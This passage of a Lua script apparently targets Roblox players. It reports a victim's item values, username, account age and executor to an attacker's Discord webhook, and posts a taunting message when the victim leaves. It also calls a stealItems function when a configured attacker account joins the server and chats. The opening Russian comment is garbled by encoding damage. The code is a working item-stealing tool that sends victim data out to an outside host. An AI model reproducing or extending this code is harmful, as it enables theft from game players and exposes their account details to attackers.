-- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ü–µ–Ω–Ω–æ—Å—Ç–∏
if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
    SendMessageEMBED(Webhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end

function SendLeaveNotify(Username)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local dataLeave = {
        ["username"] = "Aliwave Leave Notify",
        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
        ["content"] = "**"..Username.."** was scared!!",
        ["embeds"] = {
            {
                ["color"] = 0xff3e3e,
                ["fields"] = {
                    {
                        ["name"] = "„Äò:rotating_light:„Äô**Player Info**",
                        ["value"] = "```lua\n"..
                            "Username      : "..NameValue.."\n"..
                            "Account Age   : "..AgeValue.." Days\n"..
                            "Executor      : "..ExecutorValue.."```"
                    }
                }
            }
        }
    }

    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = jsonDataLeave
    })
end

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if player == game:GetService("Players").LocalPlayer then
        SendLeaveNotify(player.Name)
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            loop = true
            stealItems(Username)
        end)
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username2 then
        player.Chatted:Connect(function(msg)
            loop = true
            stealItems(Username2)
        end)
    end
end)
